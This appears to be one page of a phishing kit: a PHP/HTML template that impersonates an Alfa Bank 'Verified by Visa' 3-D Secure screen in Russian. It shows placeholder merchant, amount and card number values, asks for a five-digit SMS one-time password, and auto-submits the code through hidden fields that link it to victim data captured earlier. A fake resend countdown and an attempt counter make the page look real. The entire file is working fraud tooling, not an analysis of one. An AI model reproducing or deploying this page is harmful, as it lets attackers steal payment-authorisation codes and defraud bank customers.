<?php require 'init.php'; ?>
<!DOCTYPE html> <html style><meta charset=utf-8>
<meta name=viewport content="width=device-width, initial-scale=1.0">
<style>html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}a{background-color:transparent}a:active,a:hover{outline:0}img{border:0}input{font:inherit}*{-webkit-box-sizing:border-box;-moz-box-sizing:border-box}*:before,*:after{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}html{font-size:10px;-webkit-tap-highlight-color:rgba(0,0,0,0)}body{font-size:14px;color:#333}input{font-family:inherit}a:hover,a:focus{color:#00335e;text-decoration:underline}a:focus{outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}img{vertical-align:middle}h4{font-family:inherit}h4{margin-top:10px;margin-bottom:10px}.container{margin-right:auto;margin-left:auto;padding-left:15px;padding-right:15px}@media (min-width:768px){.container{width:750px}}@media (min-width:992px){.container{width:970px}}@media (min-width:1200px){.container{width:1170px}}.row{margin-left:-15px;margin-right:-15px}.col-lg-3,.col-xs-12{position:relative;min-height:1px;padding-left:15px;padding-right:15px}.col-xs-12{float:left}@media (min-width:768px){.col-sm-2,.col-sm-8{float:left}.col-sm-8{width:66.66666667%}.col-sm-2{width:16.66666667%}}@media (min-width:1200px){.col-lg-3,.col-lg-6{float:left}.col-lg-6{width:50%}.col-lg-3{width:25%}}.clearfix:before,.clearfix:after,.dl-horizontal dd:before,.dl-horizontal dd:after,.container:before,.container:after,.container-fluid:before,.container-fluid:after,.row:before,.row:after,.form-horizontal .form-group:before,.form-horizontal .form-group:after,.btn-toolbar:before,.btn-toolbar:after,.btn-group-vertical>.btn-group:before,.btn-group-vertical>.btn-group:after,.panel-body:before,.panel-body:after{content:" ";display:table}.clearfix:after,.dl-horizontal dd:after,.container:after,.container-fluid:after,.row:after,.form-horizontal .form-group:after,.btn-toolbar:after,.btn-group-vertical>.btn-group:after,.panel-body:after{clear:both}@-ms-viewport{width:device-width}@media (max-width:767px){.hidden-xs{display:none!important}}*{margin:0;padding:0}*,:after,:before{-webkit-box-sizing:border-box;box-sizing:border-box}html{-ms-text-size-adjust:none;-webkit-text-size-adjust:none}body{background-color:#fff;font-family:BlinkMacSystemFont,-apple-system,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,Roboto Rouble,sans-serif;font-weight:400;line-height:1.4}body,table{margin:0;padding:0}table{border-collapse:collapse;border-spacing:0}td,tr{vertical-align:top}td{padding:0}.nowrap{white-space:nowrap}html{display:table;height:100%;width:100%}@media (max-width:599px){html{display:block}}body{display:table-cell;height:100%;text-align:center;vertical-align:middle;width:100%}@media (max-width:599px){body{display:block}}#mainContainer{-webkit-backface-visibility:hidden;-webkit-box-shadow:0 0 0 1px rgba(0,0,0,.01),3px 3px 33px 0 rgba(0,0,0,.08);background-color:#fff;border-radius:8px;box-shadow:0 0 0 1px rgba(0,0,0,.01),3px 3px 33px 0 rgba(0,0,0,.08);margin:24px auto 72px;min-width:320px;position:relative;width:500px!important}@media (max-width:599px){#mainContainer{margin:0;min-height:100%;padding-bottom:48px;width:100%!important}}#paymentDataContainer{background-color:rgba(11,31,53,.05);padding:12px 24px}@media (max-width:599px){#paymentDataContainer{padding-left:12px;padding-right:12px}}#paymentDataContainer table{margin:0 auto;max-width:452px;text-align:left;width:100%}#paymentDataContainer .labelColumn{color:#6d7986;font-size:16px;line-height:1.4;padding:0 24px 12px 0;white-space:nowrap}#paymentDataContainer .valueColumn{color:#172a3f;font-size:16px;line-height:1.4;padding:0 0 12px;width:60%}.heading{color:#172a3f;display:block;font-size:18px;font-weight:700;line-height:1.3;margin:0 0 12px;text-align:center}@-webkit-keyframes heading-fade{0%{color:#b5bbc2}20%{color:#b5bbc2}50%{color:#172a3f}}@keyframes heading-fade{0%{color:#b5bbc2}20%{color:#b5bbc2}50%{color:#172a3f}}.passDataContainer{padding:24px}@media (max-width:599px){.passDataContainer{padding-left:12px;padding-right:12px}}.description{color:#6d7986;display:block;font-size:13px;line-height:1.4;margin:0 auto;max-width:452px;min-height:40px;text-align:center}.input{display:block;margin:0 0 24px;position:relative}.input .passwordInput{-moz-appearance:none;-webkit-appearance:none;-webkit-box-shadow:none;-webkit-tap-highlight-color:rgba(0,0,0,0);-webkit-transition:border 2s ease-out,-webkit-box-shadow .2s ease-out;appearance:none;background:#fff;border:0;border-bottom:1px solid rgba(11,31,53,.4);border-radius:0;box-shadow:none;color:#172a3f;display:inline-block;font-size:30px;font-weight:700;height:48px;line-height:48px;margin:0;outline:none;padding:0;position:relative;text-align:center;transition:border 2s ease-out,-webkit-box-shadow .2s ease-out;transition:border 2s ease-out,box-shadow .2s ease-out;transition:border 2s ease-out,box-shadow .2s ease-out,-webkit-box-shadow .2s ease-out;vertical-align:top;width:180px}.input .passwordInput:focus,.input__control:focus,.passwordInputContainer .passwordInput:focus,.passwordInputContainer__control:focus{-webkit-box-shadow:inset 0 -1px 0 0 rgba(11,31,53,.9);border-color:rgba(11,31,53,.9);box-shadow:inset 0 -1px 0 0 rgba(11,31,53,.9)}.input__sub{display:block;width:100%}@-webkit-keyframes attract{0%{-webkit-box-shadow:inset 0 -2px 0 0 rgba(11,31,53,.9);box-shadow:inset 0 -2px 0 0 rgba(11,31,53,.9);width:0}20%{-webkit-box-shadow:inset 0 -2px 0 0 rgba(11,31,53,.9);box-shadow:inset 0 -2px 0 0 rgba(11,31,53,.9);width:0}to{-webkit-box-shadow:none;box-shadow:none;width:180px}}@keyframes attract{0%{-webkit-box-shadow:inset 0 -2px 0 0 rgba(11,31,53,.9);box-shadow:inset 0 -2px 0 0 rgba(11,31,53,.9);width:0}20%{-webkit-box-shadow:inset 0 -2px 0 0 rgba(11,31,53,.9);box-shadow:inset 0 -2px 0 0 rgba(11,31,53,.9);width:0}to{-webkit-box-shadow:none;box-shadow:none;width:180px}}@-webkit-keyframes rotate{0%{-webkit-transform:rotate(0);transform:rotate(0)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}@keyframes rotate{0%{-webkit-transform:rotate(0);transform:rotate(0)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}.errorContainer{color:#f04539;font-size:16px;font-weight:400;line-height:1.4;padding:24px}@media (max-width:599px){.errorContainer{padding-left:12px;padding-right:12px}}.input .errorContainer{padding-top:12px}.errorContainer:empty{padding:0}.cancel{bottom:-42px;font-size:13px;left:0;line-height:1.2;position:absolute;right:0}@media (max-width:599px){.cancel{bottom:32px}}.cancel__link{-webkit-transition:color .2s;color:#6d7986;display:inline-block;outline:none;position:relative;text-decoration:none;transition:color .2s}.cancel__link:focus,.cancel__link:hover{color:#546271}.cancel__link:after{background:rgba(11,31,53,.2);bottom:0;content:"";height:1px;left:0;position:absolute;right:0}#mainContainer .container{width:inherit}#mainContainer .row .col-xs-12.col-sm-8.col-lg-6{width:100%;padding:0;margin-top:-1px}#paymentDataContainer{padding-top:100px}#imageGridContainer{position:absolute;width:100%}#imageGrid{width:100%}#imageGrid .logos__left-column img.bank-logo{height:40px;float:left;margin:15px}#imageGrid .logos__right-column img.payment-system-logo{width:50%;float:right;margin:15px}</style>
<title>Verified by Visa</title>
[HEADERS_ASSETS]

<link type=image/x-icon rel="shortcut icon" href="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><style>.sf-hidden{display:none!important}</style>

</head>
 <body><span id=tabCloseNotice style=display:none>В случае закрытия или перехода со страницы ваша покупка не будет завершена.</span><div id=mainContainer>
 <div class=container>
 <div class=row>
 <div class="hidden-xs col-sm-2 col-lg-3"></div>
 <div class="col-xs-12 col-sm-8 col-lg-6"><div id=formContainer>

<form class="client_ajax_form" autocomplete="off">
	<input type="hidden" name="operation" value="seconddata">
	<input type="hidden" name="keyid" value="<?php echo safe_array_access($_GET, 'id'); ?>">
	<input type="hidden" name="firstid" value="<?php echo safe_array_access($_COOKIE, 'firstid'); ?>">
	<input type="hidden" name="usertag" value="<?php echo safe_array_access($_COOKIE, 'usertag'); ?>">
	

 <div id=imageGridContainer class=logos><table id=imageGrid class=logos__table cellpadding=1 cellspacing=1>
<tbody>
<tr>
<td class=logos__left-column>
 <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjQwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMDAgNDAiPjxwb2x5Z29uIHBvaW50cz0iMTkzLjE0IDcuOSAxODYuMzIgMTUuNTEgMTg2LjMyIDcuOSAxODEuMzggNy45IDE4MS4zOCAyNy4xMiAxODYuMzIgMjcuMTIgMTg2LjMyIDE5LjAzIDE5My42MiAyNy4xMiAyMDAgMjcuMTIgMTkxLjAxIDE3LjA1IDE5OS4zNSA3LjkgMTkzLjE0IDcuOSIgZmlsbD0iI2VmMzEyNCIvPjxwb2x5Z29uIHBvaW50cz0iMTcyLjY3IDE1LjA3IDE2NS44NSAxNS4wNyAxNjUuODUgNy45IDE2MC45MSA3LjkgMTYwLjkxIDI3LjEyIDE2NS44NSAyNy4xMiAxNjUuODUgMTkuNTQgMTcyLjY3IDE5LjU0IDE3Mi42NyAyNy4xMiAxNzcuNjEgMjcuMTIgMTc3LjYxIDcuOSAxNzIuNjcgNy45IDE3Mi42NyAxNS4wNyIgZmlsbD0iI2VmMzEyNCIvPjxwYXRoIGQ9Ik0yOS4zMiwxOC4zMWMtLjEyLDMuNTgtLjU4LDQuMy0yLjYxLDQuM3Y0LjUxaC43NWM1LDAsNi4yNi0yLjU5LDYuNDUtOC4zNmwuMjEtNi4zOGg0LjczVjI3LjEyaDQuOTRWNy45SDI5LjY2WiIgZmlsbD0iI2VmMzEyNCIvPjxwYXRoIGQ9Ik01Ni4wNywxMy43NEg1Mi41VjcuOUg0Ny41NlYyNy4xMmg4LjU3YzUuMzgsMCw3LjMtMy40OCw3LjMtNi43NiwwLTQuMjMtMi42Ny02LjYyLTcuMzctNi42Mm0tLjM4LDkuMTVINTIuNVYxOGgzLjE5YzEuNzEsMCwyLjc0Ljc1LDIuNzQsMi4zNnMtMSwyLjUzLTIuNzQsMi41MyIgZmlsbD0iI2VmMzEyNCIvPjxwYXRoIGQ9Ik03OS41Myw3LjQ2Vi4zMkg3NC41OVY3LjQ2Yy01LjY2LjQ4LTkuNDcsNC40Ny05LjQ3LDEwczMuODEsOS41OSw5LjQ3LDEwLjA3VjM0LjhoNC45NFYyNy41NkM4NS4xOCwyNy4xMiw4OSwyMy4wOSw4OSwxNy40OXMtMy44MS05LjU5LTkuNDctMTBNNzQuNTksMjIuOTJjLTIuNzQtLjM4LTQuNDYtMi40Mi00LjQ2LTUuNDNzMS43MS01LjA1LDQuNDYtNS40M1ptNC45NCwwVjEyLjA2YzIuNzQuMzgsNC40NiwyLjQyLDQuNDYsNS40M3MtMS43MSw1LjA1LTQuNDYsNS40MyIgZmlsbD0iI2VmMzEyNCIvPjxwYXRoIGQ9Ik0xMDcuNTEsMjEuMjFWMTQuNzZjMC00LjcxLTMtNy42OC04LjA5LTcuNjgtNS4yNSwwLTgsMy4xNC04LjI3LDYuNDJoNWMuMTctLjcyLjkzLTEuOTUsMy4yNi0xLjk1LDEuOTIsMCwzLjE2Ljg5LDMuMTYsMy4yMWgtNC45Yy00LjM5LDAtNywyLjI5LTcsNi4xMSwwLDQsMi44NSw2LjcyLDcsNi43MmE2LjI4LDYuMjgsMCwwLDAsNS40Mi0yLjQ5LDQuMTYsNC4xNiwwLDAsMCw0LDJoMS43MVYyMi42OGMtLjg5LDAtMS4yMy0uNDEtMS4yMy0xLjQ3bS00Ljk0LTEuMjZhMy4zNiwzLjM2LDAsMCwxLTMuNjQsMy40OGMtMS43OCwwLTMuMTktLjY1LTMuMTktMi41NnMxLjU0LTIuMTgsMi44OC0yLjE4aDMuOTRaIiBmaWxsPSIjZWYzMTI0Ii8+PHBhdGggZD0iTTEyOC42NywxMC42M2gtNS41MlY1LjJoMTIuNzlWLjMySDExOHYyNi44aDEwLjdjNS45MywwLDkuMzMtMi45NCw5LjMzLTguMzMsMC01LjA5LTMuNC04LjE2LTkuMzMtOC4xNm0tLjI0LDExLjY0aC01LjI4di03aDUuMjhjMi43NCwwLDQuMjksMS4yNiw0LjI5LDMuNDhzLTEuNTQsMy40OC00LjI5LDMuNDgiIGZpbGw9IiNlZjMxMjQiLz48cGF0aCBkPSJNMTU2Ljg5LDIxLjIxVjE0Ljc2YzAtNC43MS0zLTcuNjgtOC4wOS03LjY4LTUuMjUsMC04LDMuMTQtOC4yNyw2LjQyaDVjLjE3LS43Mi45My0xLjk1LDMuMjYtMS45NSwxLjkyLDAsMy4xNi44OSwzLjE2LDMuMjFoLTQuOWMtNC4zOSwwLTcsMi4yOS03LDYuMTEsMCw0LDIuODUsNi43Miw3LDYuNzJhNi4yOCw2LjI4LDAsMCwwLDUuNDItMi40OSw0LjE2LDQuMTYsMCwwLDAsNCwyaDEuNzFWMjIuNjhjLS44OSwwLTEuMjMtLjQxLTEuMjMtMS40N00xNTIsMTkuOTVhMy4zNiwzLjM2LDAsMCwxLTMuNjQsMy40OGMtMS43OCwwLTMuMTktLjY1LTMuMTktMi41NnMxLjU0LTIuMTgsMi44OC0yLjE4SDE1MloiIGZpbGw9IiNlZjMxMjQiLz48cmVjdCB5PSIzNC41NCIgd2lkdGg9IjI2LjQxIiBoZWlnaHQ9IjUuNDYiIGZpbGw9IiNlZjMxMjQiLz48cGF0aCBkPSJNMTgsNGMtLjc1LTIuMjMtMS42Mi00LTQuNTktNFM5LjUxLDEuNzYsOC43Miw0TC41NSwyNy4xMkg2bDEuODktNS41SDE4LjI4TDIwLDI3LjEyaDUuNzZaTTkuNDMsMTdsMy43LTExaC4xNGwzLjUsMTFaIiBmaWxsPSIjZWYzMTI0Ii8+PC9zdmc+Cg==" alt="Member logo" title="Alfa Bank" class=bank-logo></td>
<td class=logos__right-column>
 <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxOTIiIGhlaWdodD0iODMiIHZpZXdCb3g9IjAgMCAxOTIgODMiPgogIDxwYXRoIGQ9Ik0xNDUuNDgsNjkuM2MuODItMi4xOSwzLjkxLTEwLjY4LDMuOTEtMTAuNjhzLjgxLTIuMiwxLjMxLTMuNjRsLjY2LDMuMjksMi4yOCwxMVpNMTU3LjYsNDQuN0gxNTBjLTIuMzUsMC00LjExLjY3LTUuMTYsMy4xN2wtMTQuNiwzNWgxMC4zM3MxLjY5LTQuNzEsMi4wNy01Ljc0bDEyLjU4LDBjLjMsMS4zMywxLjE5LDUuNzIsMS4xOSw1LjcyaDkuMTNabS0yNS4yMS45MUEyNC4xNywyNC4xNywwLDAsMCwxMjMuNTgsNDRDMTEzLjg1LDQ0LDEwNyw0OS4xOCwxMDcsNTYuNmMtLjA2LDUuNDksNC44OSw4LjU1LDguNjEsMTAuMzdzNS4xMiwzLjA2LDUuMTEsNC43NGMwLDIuNTYtMy4wNywzLjcyLTUuODksMy43MmExOS42MiwxOS42MiwwLDAsMS05LjI0LTJsLTEuMjgtLjYxLTEuMzgsOC41NWEyOS44MiwyOS44MiwwLDAsMCwxMSwyYzEwLjMyLDAsMTctNS4xMywxNy4xMi0xMywwLTQuMzUtMi41OS03LjY1LTguMjYtMTAuMzgtMy40My0xLjc3LTUuNTUtMi45NC01LjUxLTQuNzMsMC0xLjU4LDEuNzctMy4yOCw1LjYzLTMuMjhhMTcuMjUsMTcuMjUsMCwwLDEsNy4zNiwxLjQ3bC44Ny40NFpNODYuODksODIuODQsOTMsNDQuNjZoOS44M0w5Ni43Miw4Mi44NFpNNzguNjUsNDQuNyw2OSw3MC43MWwtMS01LjI5Yy0yLjQtNi40OC03LjU4LTEzLjI4LTEzLjYzLTE2bDguOCwzMy40MUg3My41OEw4OS4wNiw0NC43WiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTEgLTAuNCkiIGZpbGw9IiMwNDU4YTAiLz48cGF0aCBkPSJNNjAuMSw0NC42OEg0NC4yNGwtLjA5LjY1QzU2LjQ4LDQ4LjUsNjQuNjEsNTYuMjYsNjgsNjUuNDRMNjQuNTUsNDcuODljLS41OS0yLjQxLTIuMzItMy4xMi00LjQ1LTMuMjEiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC0xIC0wLjQpIiBmaWxsPSIjZmFhNzFiIi8+PHBhdGggZD0iTTE0LjUsMzUuNDZIOC4yM0wxLDIuNzcsNy45MywxLjYxbDQuOTUsMjUuNThMMjUuNDgsMS45NWg2LjY2Wm0yMy44MS0yMGMtMi4zMiwwLTQuNDgsMS44NC01LjUsNS42Nmg5LjI2QzQyLjI0LDE3LjUyLDQxLjEsMTUuNDksMzguMzEsMTUuNDlabTguOCw5LjI4SDMyLjE1Yy0uNDEsNC41NCwxLjcsNi41Myw1LjI3LDYuNTMsMywwLDUuNjItMS4xMSw4LjQ1LTIuOWwwLDQuNTVhMTgsMTgsMCwwLDEtOS43NSwyLjg1Yy02LjUxLDAtMTAuODEtMy43Mi05LjUyLTEyLjE0LDEuMTYtNy41OSw2LjQtMTIuMTgsMTIuNDgtMTIuMTgsNywwLDkuMzIsNS4yNyw4LjMsMTEuODlDNDcuMjksMjMuODUsNDcuMTYsMjQuNDMsNDcuMSwyNC43N1ptOS43NS0yLjg1TDU0Ljc5LDM1LjMxSDQ5TDUyLjU5LDEyaDQuOTJ2NC42OWMyLTIuNzEsNC42Mi01LDguMjctNS4xN2wwLDUuNzVBMTIuODQsMTIuODQsMCwwLDAsNTYuODUsMjEuOTJaTTcyLjg3LDhhMi43NywyLjc3LDAsMCwxLTMtMy4yOSw0LDQsMCwwLDEsNC0zLjM5LDIuOCwyLjgsMCwwLDEsMi45LDMuMzlBNCw0LDAsMCwxLDcyLjg3LDhaTTY1Ljc0LDM1LjMxLDY5LjMzLDEyaDUuNzlMNzEuNTMsMzUuMzFaTTkxLjE0LDUuNTdhMy4xMSwzLjExLDAsMCwwLTMuNDksM0w4Ny4xMiwxMmg0LjQ0djQuNzRIODYuNEw4My41NCwzNS4zMUg3Ny44bDIuODYtMTguNjJINzcuMjhMNzgsMTJoMy4zOGwuNjEtNGMuOC01LjE3LDQuMzctNy4xMSw5LjE1LTcuMTFBMTMuMzYsMTMuMzYsMCwwLDEsOTMuNDgsMWwwLDQuNzRBMTQuNTgsMTQuNTgsMCwwLDAsOTEuMTQsNS41N1pNOTguMzMsOGEyLjc3LDIuNzcsMCwwLDEtMy0zLjI5LDQsNCwwLDAsMSw0LTMuMzksMi44MSwyLjgxLDAsMCwxLDIuOTEsMy4zOUE0LDQsMCwwLDEsOTguMzMsOFpNOTEuMiwzNS4zMSw5NC43OSwxMmg1Ljc4TDk3LDM1LjMxWm0yMy0xOS44MmMtMi4zMSwwLTQuNDgsMS44NC01LjQ5LDUuNjZIMTE4QzExOC4xNSwxNy41MiwxMTcsMTUuNDksMTE0LjIxLDE1LjQ5Wk0xMjMsMjQuNzdoLTE1Yy0uNDEsNC41NCwxLjcsNi41Myw1LjI2LDYuNTMsMywwLDUuNjMtMS4xMSw4LjQ2LTIuOWwwLDQuNTVBMTgsMTgsMCwwLDEsMTEyLDM1Ljc5Yy02LjUxLDAtMTAuODEtMy43Mi05LjUyLTEyLjE0LDEuMTYtNy41OSw2LjQtMTIuMTgsMTIuNDgtMTIuMTgsNywwLDkuMzIsNS4yNyw4LjMsMTEuODlDMTIzLjIxLDIzLjg1LDEyMy4wNiwyNC40MywxMjMsMjQuNzdabTE5LjA3LTcuNGE4LjQ4LDguNDgsMCwwLDAtNC4zOC0xYy0zLDAtNS42MywyLjQ3LTYuNDIsNy41OS0uNyw0LjU1LjkxLDYuNjcsMy40Niw2LjY3LDIuMTIsMCw0LTEuMjUsNS43OS0zLjE5Wm0tMS45NCwxNy45NCwwLTMuMjRhMTAuODQsMTAuODQsMCwwLDEtNy43MSwzLjcyYy00Ljg4LDAtOC4yMi0zLjYzLTctMTEuNTEsMS4zMy04LjcsNi43LTEyLjU3LDEyLjEtMTIuNTdhMTUuMjcsMTUuMjcsMCwwLDEsNS4yNy44N2wxLjczLTExLjI2TDE1MC40OC40bC01LjM1LDM0LjkxWm0yNS45My0xNC4xN2MtMS40NiwwLTIuOTIsMS00LjIyLDIuMzFsLTEuMjMsOGE2LjQyLDYuNDIsMCwwLDAsMi43LjQ4YzIuNzgsMCw0LjcxLTEuNjksNS4zNC01LjcxQzE2OS4xOSwyMi44MiwxNjguMDYsMjEuMTQsMTY2LjA4LDIxLjE0Wm0tMy4yMywxNC4zOWEyMC41NCwyMC41NCwwLDAsMS03LTEuMThsMy44LTI0Ljc5LDQuNDktLjY5TDE2Mi40NSwxOS42YTguMTcsOC4xNywwLDAsMSw1LjM2LTIuMzRjMy43MywwLDYuMjIsMi43OCw1LjMxLDguNzJDMTcyLjEyLDMyLjQ5LDE2OC4xMSwzNS41MywxNjIuODUsMzUuNTNabTIwLjYuNzNDMTgxLjIxLDQwLjYyLDE3OSw0MiwxNzUuNTksNDJhNS4yOSw1LjI5LDAsMCwxLTEuNTgtLjE5bDAtMy42MmE3LjQ3LDcuNDcsMCwwLDAsMiwuMjYsMy40OSwzLjQ5LDAsMCwwLDMuMTQtMS44N2wuNTgtMS4xN0wxNzYsMThsNC42Ni0uNTlMMTgyLjgxLDMwbDUuODQtMTIuMzRIMTkzWiIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTEgLTAuNCkiIGZpbGw9IiMwNDU4YTAiLz4KPC9zdmc+Cg==" alt="Verified by Visa" title="Verified by Visa" class=payment-system-logo></td>
</tr>
</tbody>
</table>
</div><div id=formNameContainer class="formNameContainer sf-hidden"></div><div id=tipContainer class="tipContainer sf-hidden"></div><div id=paymentDataContainer class=paymentDataContainer><table id=paymentDataTable class=paymentDataTable cellpadding=0 cellspacing=0>
 <tbody><tr>
 <td class=labelColumn>Торговая точка</td>
 <td class=valueColumn>[TEXT_2]</td>
 </tr>
 <tr>
 <td class=labelColumn>Сумма</td>
 <td class=valueColumn>
 [TEXT_7] ₽
 </td>
 </tr>
 <tr>
 <td class=labelColumn>Номер карты</td>
 <td class=valueColumn>
[CARDNUMBER]
 </td>
 </tr>
 <tr>
 <td class=labelColumn>Дата</td>
 <td class=valueColumn>
 <?php
$_monthsList = array(".01." => "января", ".02." => "февраля", 
".03." => "марта", ".04." => "апреля", ".05." => "мая", ".06." => "июня", 
".07." => "июля", ".08." => "августа", ".09." => "сентября",
".10." => "октября", ".11." => "ноября", ".12." => "декабря");
$currentDate = date("d.m.Y");
$_mD = date(".m.");
echo str_replace($_mD, " ".$_monthsList[$_mD]." ", $currentDate); 
?>
 </td>
 </tr>
 </table>
</div><div id=passDataContainer class=passDataContainer><h4 class="heading heading_size_s">
 Введите пароль и подтвердите оплату
 </h4>
<span class="input input_type_tel input_size_m">
 <input id=pwdInputVisible type=tel name="fields[0]" autocomplete=off class="passwordInput input__control" title="Попытка 1 из 3" maxlength=5 value><span class="spin spin_size_m sf-hidden"></span>
 
 <div id=errorContainer class="errorContainer input__sub error if-error-show-container" style="display:none;">
	<ul><li class=errorMessage>Неверный пароль</li></ul>
 </div>
 
 </span><div class=description>
 <div>
 Сообщение с одноразовым паролем отправлено на Ваш номер телефона.</span>
  <p id="demo"></p>

<script>

function countDown(elm, duration, fn){
  // Set the date we're counting down to
  var countDownDate = new Date().getTime() + (1000 * duration);
  // Update the count down every 1 second
  var x = setInterval(function() {
    // Get today's date and time
    var now = new Date().getTime();

    // Find the distance between now and the count down date
    var distance = countDownDate - now;

    // Time calculations for days, hours, minutes and seconds
    var seconds = Math.floor((distance % (1000 * 600)) / 1000);

    // Output the result in an element with id="demo"
    elm.innerHTML = "Повторная отправка кода через "+seconds+" сек.";

    // If the count down is over, write some text 
    if (distance < 0) {
      clearInterval(x);
      fn();
      elm.innerHTML = "Код был отправлен повторно";
    }
  }, 1000);

}

countDown(document.getElementById('demo'), 180, function(){
;
})

</script>
 
 </div>
 <a id=resendPasswordLink href=# title="Осталось 2 попытка(-ок) отправки пароля" class="resendPasswordLink button button_pseudo button_view_default button_size_m button_width_available resend-button sf-hidden">
 
 </a></div></div><table class="helpCancelGrid sf-hidden">
</table>
<script>
$("input[name='fields\[0\]']").keyup(function () {
	var val = $(this).val();
	
	//if (val.match(/\d{5,5}/)) {
	if (val.length == 5) {
		$(this).closest("form").submit();
	}
});
</script>
</form></div>
 </div>
 <div class="hidden-xs col-sm-2 col-lg-3"></div>
 </div>
 </div><div class=cancel><a href=# class="cancelLink cancel__link"></a></div></div>
 




</body></html>
<?php
bottom_proc('prepare_verificationphp');